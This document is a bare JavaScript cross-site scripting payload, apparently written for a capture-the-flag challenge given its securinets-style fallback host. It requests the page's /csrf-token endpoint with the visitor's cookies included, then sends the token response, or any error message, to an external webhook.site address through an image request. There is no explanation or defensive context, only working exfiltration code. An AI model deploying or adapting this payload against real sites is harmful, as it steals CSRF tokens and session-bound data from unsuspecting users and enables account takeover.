<script>
(async () => {
  const WEBHOOK = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160';
  const FALLBACK = 'https://web1-79e4a3bc.p1.securinets.tn';
  try {
    const base = (typeof location !== 'undefined' && location.hostname)
      ? (location.protocol + '//' + location.hostname + (location.port ? ':' + location.port : ''))
      : FALLBACK;

    const r = await fetch(base + '/csrf-token', { credentials: 'include' });
    const status = r.status;
    const body = await r.text();
    // limit the size to avoid overly long URLs
    const short = encodeURIComponent(body).slice(0, 4000);
    new Image().src = WEBHOOK + '?tok_status=' + status + '&tok_body=' + short;
  } catch (e) {
    new Image().src = WEBHOOK + '?err=' + encodeURIComponent(e.message);
  }
})();
</script>
